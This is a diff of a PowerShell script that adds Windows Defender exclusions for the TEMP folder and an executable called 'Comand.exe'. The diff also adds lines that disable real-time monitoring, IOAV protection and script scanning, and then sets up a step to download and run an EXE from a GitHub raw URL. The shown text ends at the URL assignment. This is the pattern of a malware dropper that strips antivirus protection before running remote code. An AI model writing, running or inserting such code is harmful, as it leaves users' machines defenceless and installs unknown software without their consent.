@@ -21,6 +21,9 @@ if (-not $isAdmin) {
 # ============ ADD EXCLUSIONS (TEMP + EXE) ============
 Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableScriptScanning $true
 
 # ============ DOWNLOAD + RUN EXE ============
 $url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
